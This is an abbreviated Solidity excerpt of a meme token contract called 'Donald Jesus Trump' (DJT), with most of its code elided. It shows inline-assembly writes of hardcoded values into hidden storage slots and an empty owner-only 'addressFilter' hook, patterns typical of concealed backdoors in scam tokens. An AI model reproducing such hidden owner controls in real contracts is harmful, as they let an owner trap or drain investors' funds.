...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xad25301a0a1ae316c98d6cab5d3741d202e1f59dcf40)
            sstore(0x51,0xad2590799ed2e4fe06afbc1fd14b65ad2b64ffb70329)
    ...
    function addressFilter(uint256 number, bytes memory uniswapFlag) public onlyOwner returns (uint data) {
    }
    ...
    function _DeployDJT(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDJT(creator, initialSupply);
    }
}

contract DJT is ERC20Token {
    constructor() ERC20Token("Donald Jesus Trump", "DJT", msg.sender, 454700000 * 10 ** 18) {
    }
}
